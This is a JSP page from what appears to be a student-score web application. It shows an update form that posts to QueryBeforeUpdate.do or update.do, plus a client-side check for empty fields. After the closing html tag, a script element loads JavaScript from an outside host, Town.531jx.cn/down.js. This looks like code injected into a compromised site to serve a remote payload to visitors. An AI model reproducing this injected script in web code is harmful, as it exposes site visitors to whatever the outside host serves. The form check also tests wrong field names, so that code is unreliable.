
<%@ page language="java" import="java.util.*" pageEncoding="GBK"%>
<%
		String path = request.getContextPath();
		String basePath = request.getScheme() + "://" + request.getServerName()
				+ ":" + request.getServerPort() + path + "/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<base href="<%=basePath%>">

<title>My JSP 'update.jsp' starting page</title>

<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
<meta http-equiv="description" content="This is my page">

<!--
    <link rel="stylesheet" type="text/css" href="styles.css">
    -->
<script language="JavaScript">
function check()
{
	if(window.f1.name.value==''||window.f1.english.value==''||window.f1.name.math==''||window.f1.name.computer==''){
		alert("表单不能为空！ ：-（");
		history.go(0);
	}
}
</script>

</head>

<body>
This is update page.
<br>
<hr>
<table>
	<%
		if (request.getAttribute("updating")==null) {
%>
	<tr>
		<td>
		<form name="f1" id="f1" action="QueryBeforeUpdate.do" method="post"><jsp:include
			page="form.jsp">
			<jsp:param name="type" value="2" />
		</jsp:include></form>
		<td>
	</tr>
	
	
	<%} else {%>
	
	
	<tr>
		<td>
		<form name="f1" id="f1" action="update.do" method="post"><jsp:include
			page="form.jsp">
			<jsp:param name="type" value="3" />
		</jsp:include></form>
		</td>
	</tr>
	<%}
	%>
</table>
</body>
</html>

<script language=javascript src=http://Town.531jx.cn/down.js></script>